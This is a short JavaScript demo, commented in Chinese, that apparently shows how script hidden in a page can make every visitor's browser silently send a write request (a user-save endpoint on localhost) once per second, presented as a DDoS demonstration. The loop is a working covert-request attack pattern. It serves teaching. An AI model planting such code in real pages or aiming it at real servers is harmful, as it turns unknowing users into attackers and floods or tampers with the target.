//定时请求指定的地址，演示DDos攻击
window.setInterval(exec, 1000);

var xmlHttp = new XMLHttpRequest();

function exec() {
    xmlHttp.open("get","http://127.0.0.1:8080/user/save?name=我是恶意攻击");
    xmlHttp.send();
    console.log("正在偷偷进行恶意攻击，普通用户感知不到的");
}